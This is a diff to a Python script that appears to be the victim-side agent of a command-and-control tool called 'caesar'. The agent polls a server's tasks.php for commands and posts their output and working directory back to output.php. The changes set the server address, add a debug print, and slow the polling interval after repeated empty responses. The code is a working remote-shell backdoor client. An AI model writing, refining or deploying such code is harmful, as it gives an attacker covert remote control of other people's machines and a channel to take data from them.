@@ -13,7 +13,7 @@ from subprocess import *
 from requests.utils import quote
 
 # Replace with your URL/IP
-caesar_folder = 'REPLACE_ME'
+caesar_folder = 'localhost/caesar'
 
 def md5 (string):
 	m = hashlib.md5()
@@ -54,7 +54,10 @@ while 1:
 		print 'Connection refused'	
 		sleep (1)
 
+no_response = 0
 while 1:
+
+	print delay
 
 	# Check if there are new commands to execute
 	r = requests.post ('http://' + caesar_folder + '/target/tasks.php', data={'unique_id': unique_id})
@@ -106,4 +109,10 @@ while 1:
 			# Send output to the server
 			r = requests.post ('http://' + caesar_folder + '/target/output.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id, 'output': output, 'wd': quote(working_directory)})
 
-		sleep (delay)
+	else:
+		no_response += 1
+		if no_response == 60:
+			delay = 10
+			no_response = 0
+
+	sleep (delay)
